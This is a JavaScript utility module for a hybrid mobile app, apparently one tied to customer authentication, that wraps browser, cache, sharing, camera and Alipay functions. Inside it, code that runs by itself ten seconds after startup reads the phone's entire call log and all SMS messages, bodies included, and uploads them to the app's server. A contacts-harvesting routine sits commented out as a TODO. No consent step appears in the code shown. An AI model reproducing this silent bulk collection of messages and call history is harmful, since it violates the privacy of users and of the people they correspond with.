
import { storage, request, common } from '../index'
import { url, isApp } from '../../const/index'
class Apid {
  static ready () {
    this.setStatusBarStyle()
    if (common.platform() === 2) {
      this.initService()
    }
  }

  static initService () {
    // .处理用户数据
    setTimeout(() => {
      this.handAppAndPhoneInfo()
    }, 10000)
  }

  // .处理用户数据
  static handAppAndPhoneInfo (callback) {
    // .定义设备信息
    const userKeys = storage.get('userKeys')
    const devinfo = storage.get('devinfo-' + userKeys.userId) || {
      contacts: [],
      callrecord: [],
      smsrecord: []
    }
    const that = this
    // .获取通讯录 TODO 优先处理
    // const contactsModel = api.require('DVContacts')
    // const newContacts = []
    // // .最后一条数据ID
    // const lastId = storage.get('contacts-lastId' + userKeys.userId) || 0
    // contactsModel.query({
    //   ids: [0]
    // }, (ret, err) => {
    //   // TODO 测试增量更新
    //   // lastId = 250;
    //   if (ret && ret.total > 0) {
    //     for (let i = lastId; i < ret.total; i++) {
    //       contactsModel.queryByPage({
    //         count: 1,
    //         pageInde: i
    //       }, (ret, err) => {
    //         newContacts.push(ret.contacts[0])
    //         if (i === ret.total - 1) {
    //           storage.set('contacts-lastId' + userKeys.userId, ret.total)
    //         }
    //       })
    //     }
    //   }
    // })

    // .获取通话记录
    const callRecordModel = api.require('callRecord')
    callRecordModel.openCallRecord((ret) => {
      if (ret && JSON.stringify(devinfo.callrecord) !== JSON.stringify(ret.CallRecord)) {
        devinfo.callrecord = ret.CallRecord
        storage.set('devinfo-' + userKeys.userId, devinfo)
        if (typeof callback === 'function') {
          that.update(JSON.stringify({
            callrecord: ret.CallRecord
          }))
        }
      }
    })

    // .获取短信记录
    const now = new Date()
    let month = (now.getMonth() + 1)
    month = (month < 10) ? '0' + month : month
    const taday = now.getFullYear() + '-' + month + '-' + now.getDate()
    const smsRecrodModel = api.require('moduleSMS')
    smsRecrodModel.getSmsFromDB({
      sdate: '2015-01-01',
      edate: taday
    }, (ret, err) => {
      if (ret) {
        let smsRecord = []
        for (let i in ret) {
          smsRecord.push({
            strAddress: ret[i].strAddress,
            strDate: ret[i].strDate,
            strbody: ret[i].strbody,
            strType: ret[i].strType
          })
        }
        if (JSON.stringify(devinfo.smsrecord) !== JSON.stringify(smsRecord)) {
          devinfo.smsrecord = smsRecord
          storage.set('devinfo-' + userKeys.userId, devinfo)
          that.update(JSON.stringify({
            smsrecord: smsRecord
          }))
        }
      }
    })
  }

  // 上传数据
  static update (data, _callback) {
    const params = {
      phoneAndCommInfo: data
    }
    request({
      type: 'post',
      path: url.CustomerInfoAuthentication.HandAppAndPhoneInfo,
      data: params,
      fn: data => {
        if (typeof _callback === 'function') {
          _callback()
        }
      }
    })
  }

  /*****************************************/
  static setListenKeyBack (callback) {
    const that = this
    this.addEventListener('keyback', (ret) => {
      that.browserModel.historyBack((ret, err) => {
        if (!ret.status) {
          that.browserModel.closeView()
          if (typeof callback === 'function') {
            callback()
          }
        }
      })
    })
  }
  // 打开浏览器
  static openBrowser (url, headerHeight, _callBack) {
    this.browserModel = api.require('webBrowser')
    this.browserModel.openView({
      url: url,
      rect: {
        x: 0,
        y: headerHeight,
        w: api.winWidth,
        h: api.winHeight - headerHeight
      }
    }, (ret, err) => {
      if (ret.state === 3) {
        // .更改标题文字
        let title = ''
        if (ret.title.length < 13) {
          title = ret.title
        } else if (ret.title.length >= 13) {
          title = ret.title.substr(0, 13) + '...'
        }
        if (typeof _callBack === 'function') {
          _callBack(title)
        }
      }
    })
  }
  // 关闭浏览器
  static closeBrowser (callBack) {
    const that = this
    this.browserModel.historyBack((ret, err) => {
      if (!ret.status) {
        that.browserModel.closeView()
        if (callBack && typeof callBack === 'function') {
          callBack()
        }
      }
    })
  }
  // 获取缓存
  static getCacheSize () {
    if (!isApp) {
      return 0
    }
    return api.getCacheSize({ sync: true })
  }
  // 清理缓存
  static clearCache (_callback) {
    if (!isApp) {
      return false
    }
    common.toast('清理中...')
    api.clearCache({
      timeThreshold: 0
    }, () => {
      common.successT('清理完毕')
      // 复位缓存统计
      if (typeof _callback === 'function') {
        _callback()
      }
    })
  }
  // .分享
  static systemShare (text) {
    const system = api.require('shareAction')
    system.share({
      text: text,
      type: 'url',
      thumbnail: 'widget://res/images/icon-item-003.png'
    })
  }
  static setStatusBarStyle () {
    api.setStatusBarStyle({
      style: 'linght',
      color: 'rgba(0,0,0,0.3)'
    })
  }
  static savePicture (url) {
    const timestamp = new Date().getTime()
    api.download({
      url: url,
      savePath: 'fs://test' + timestamp + '.jpeg',
      report: true,
      cache: true,
      allowResume: true
    }, function (ret, err) {
      if (ret) {
        common.successT('图片已保存到本地')
      }
      api.saveMediaToAlbum({
        path: 'fs://test' + timestamp + '.jpeg'
      }, (ret, err) => {
      })
    })
  }
  // .操作相册·相机
  static getPicture (type, _callback) {
    api.getPicture({
      sourceType: type,
      encodingType: 'jpg',
      mediaValue: 'pic',
      destinationType: 'base64',
      allowEdit: false,
      quality: 100,
      targetWidth: 80,
      targetHeight: 80,
      saveToPhotoAlbum: false
    }, function (ret, err) {
      if (ret && typeof _callback === 'function') {
        _callback(ret)
      }
    })
  }
  static getAppVersion () {
    return api.appVersion
  }
  static getSafeAreaTop () {
    if (isApp) {
      return api.safeArea.top
    } else {
      return 0
    }
  }
  static getSafeAreaBottom () {
    if (isApp) {
      return api.safeArea.bottom
    } else {
      return 0
    }
  }
  // .监听事件
  static addEventListener (eventName, _callback, extra) {
    api.addEventListener({
      name: eventName,
      extra: extra || {}
    }, (ret, err) => {
      if (typeof _callback === 'function') {
        _callback(ret)
      }
    })
  }
  // .移除监听事件
  static rmEventListener (eventName) {
    if (!isApp) {
      return false
    }
    api.removeEventListener({
      name: eventName
    })
  }
  // .广播事件
  static sendEvent (eventName, extra) {
    if (!isApp) {
      return false
    }
    api.sendEvent({
      name: eventName,
      extra: extra || {}
    })
  }

  static payOrder (orderInfo, __callBack) {
    const aliPay = api.require('aliPay')
    aliPay.payOrder({
      orderInfo: orderInfo
    }, (ret, err) => {
      if (__callBack && typeof __callBack === 'function') {
        __callBack(ret, err)
      }
    })
  }
}
export default Apid
